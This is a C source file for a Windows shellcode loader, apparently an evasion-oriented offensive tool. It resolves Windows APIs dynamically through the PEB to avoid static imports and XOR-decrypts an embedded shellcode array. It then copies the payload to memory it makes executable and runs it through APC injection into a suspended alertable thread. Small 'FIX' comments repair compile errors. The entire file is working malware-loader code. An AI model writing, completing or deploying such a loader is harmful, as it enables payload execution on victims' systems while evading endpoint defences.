#include <stdio.h>
#include <windows.h>
#include "temp.h"

#include "peb.h"
typedef FARPROC(WINAPI *GETPROCADDRESS)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI *LOADLIBRARYA)(LPCSTR);
typedef void * (WINAPI *MEMCPY)(void *, const void *, size_t);
typedef BOOL (WINAPI *CLOSEHANDLE)(HANDLE);
typedef BOOL (WINAPI *VIRTUALPROTECT)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef DWORD (WINAPI *WAITFORSINGLEOBJECT)(HANDLE, DWORD);
typedef DWORD (WINAPI *SLEEPEX)(DWORD, BOOL);
typedef DWORD (WINAPI *RESUMETHREAD)(HANDLE);
typedef int (WINAPI *PRINTF)(const char *const);
typedef DWORD (WINAPI *QUEUEUSERAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
typedef LPVOID (WINAPI *VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE (WINAPI *CREATETHREAD)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

HMODULE kernel32baseAddr;
GETPROCADDRESS ptrGetProcAddress;
LOADLIBRARYA ptrLoadLibraryA;
MEMCPY memcpy_ptr;
CLOSEHANDLE CloseHandle_ptr;
VIRTUALPROTECT VirtualProtect_ptr;
WAITFORSINGLEOBJECT WaitForSingleObject_ptr;
SLEEPEX SleepEx_ptr;
RESUMETHREAD ResumeThread_ptr;
PRINTF printf_ptr;
QUEUEUSERAPC QueueUserAPC_ptr;
VIRTUALALLOC VirtualAlloc_ptr;
CREATETHREAD CreateThread_ptr;
HMODULE msvcr120_clr0400_mod;
HMODULE kernel32_mod;


SIZE_T enc_len = sizeof(shellcode);
char key[] = "xyz";

// FIX 1: Non-void function must return a value
DWORD WINAPI AlterableFunction2(){
    SleepEx_ptr(INFINITE, TRUE);
    return 0; // <- add return to fix warning
}

VOID xor_decrypt(unsigned char *data, SIZE_T len, char *key){
    SIZE_T keylen = strlen(key);
    for(SIZE_T i = 0; i < len; i++){
        data[i] ^= key[i % keylen];
    }
}

BOOL gogogo(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize){
    PVOID pAddress = NULL;

    // FIX 2: Use correct type for VirtualProtect's old protection
    DWORD dwOldProtection = 0;

    pAddress = VirtualAlloc_ptr(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        return FALSE;
    }

    memcpy_ptr(pAddress, pPayload, sPayloadSize);

    if (!VirtualProtect_ptr(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        return FALSE;
    }

    // FIX 3: NULL is (void *), but QueueUserAPC wants ULONG_PTR (integer type)
    if (!QueueUserAPC_ptr((PAPCFUNC)pAddress, hThread, (ULONG_PTR)NULL)) {
        return FALSE;
    }

    return TRUE;
}

int main(){

kernel32baseAddr = getkernel32baseAddr();
ptrGetProcAddress = (GETPROCADDRESS)GetProcAddressKernel32(kernel32baseAddr, "GetProcAddress");
ptrLoadLibraryA = (LOADLIBRARYA)GetProcAddressKernel32(kernel32baseAddr, "LoadLibraryA");

msvcr120_clr0400_mod = ptrLoadLibraryA("msvcr120_clr0400.dll");
kernel32_mod = ptrLoadLibraryA("kernel32.dll");

memcpy_ptr = (MEMCPY)ptrGetProcAddress(msvcr120_clr0400_mod, "memcpy");
CloseHandle_ptr = (CLOSEHANDLE)ptrGetProcAddress(kernel32_mod, "CloseHandle");
VirtualProtect_ptr = (VIRTUALPROTECT)ptrGetProcAddress(kernel32_mod, "VirtualProtect");
WaitForSingleObject_ptr = (WAITFORSINGLEOBJECT)ptrGetProcAddress(kernel32_mod, "WaitForSingleObject");
SleepEx_ptr = (SLEEPEX)ptrGetProcAddress(kernel32_mod, "SleepEx");
ResumeThread_ptr = (RESUMETHREAD)ptrGetProcAddress(kernel32_mod, "ResumeThread");
printf_ptr = (PRINTF)ptrGetProcAddress(msvcr120_clr0400_mod, "printf");
QueueUserAPC_ptr = (QUEUEUSERAPC)ptrGetProcAddress(kernel32_mod, "QueueUserAPC");
VirtualAlloc_ptr = (VIRTUALALLOC)ptrGetProcAddress(kernel32_mod, "VirtualAlloc");
CreateThread_ptr = (CREATETHREAD)ptrGetProcAddress(kernel32_mod, "CreateThread");

    HANDLE hthread = CreateThread_ptr(NULL, 0, AlterableFunction2, NULL, CREATE_SUSPENDED, NULL);
    if (!hthread) return 1;

    xor_decrypt(shellcode, sizeof(shellcode), key);

    if (!gogogo(hthread, (PBYTE)shellcode, sizeof(shellcode))) {
        printf_ptr("didn't queue APC\n");
    }

    ResumeThread_ptr(hthread);
    WaitForSingleObject_ptr(hthread, INFINITE);
    CloseHandle_ptr(hthread);

    return 0;
}
